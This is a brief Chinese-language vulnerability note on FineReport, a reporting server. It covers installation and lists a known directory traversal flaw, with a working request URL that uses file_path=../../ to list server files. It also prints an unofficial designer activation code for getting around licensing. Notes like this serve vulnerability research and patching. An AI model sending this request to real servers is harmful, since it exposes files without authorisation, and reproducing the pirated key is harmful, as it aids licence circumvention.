# FineReport

官方文档： https://www.finereport.com/

官方帮助文档： https://help.finereport.com/

FineReport（帆软报表）的安装较为简单，直接双击`windows_x64_FineReport-CN.exe`，选择好安装目录后自动安装，安装完成后，自动跳转到`http://localhost:8075/WebReport/ReportServer`数据决策系统，第一次使用要求先配置管理员用户名和密码。

如果要使用设计器，可以从网上找一个激活码（如`设计器激活码：63e70b50-36c054361-9578-69936c1e9a57`），点击激活即可

## 架构分析

## 历史漏洞

## 已知漏洞
 - [1.目录遍历漏洞](#目录遍历漏洞)


|漏洞名称|访问路径|漏洞定位|
|:---:|:---:|:---:|
|目录漏洞|`op=fs_remote_design&cmd=design_list_file`|——|

# 目录遍历漏洞
```
http://localhost:8075/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../../&currentUserName=admin&currentUserId=1&isWebReport=true
```
页面上会列出当前目录下的文件
